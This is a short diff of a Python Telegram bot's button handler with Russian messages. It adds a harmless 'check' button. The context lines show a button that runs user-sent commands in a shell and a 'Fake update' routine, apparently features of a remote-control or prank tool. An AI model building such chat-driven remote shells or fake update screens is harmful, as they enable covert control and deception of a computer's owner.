@@ -980,6 +980,9 @@ def handle_buttons(message):
         bot.send_message(message.chat.id, "Введите команду для выполнения (будет выполнена в shell):")
         user_state[message.chat.id] = "cmd_command"
 
+    elif message.text == "проверка":
+        bot.send_message(message.chat.id, "Проверка выполнена успешно!")
+    
     elif message.text == "Fake update":
         bot.send_message(message.chat.id, "Фейк апдейт запущен!")
         local_fake_update(duration=10)
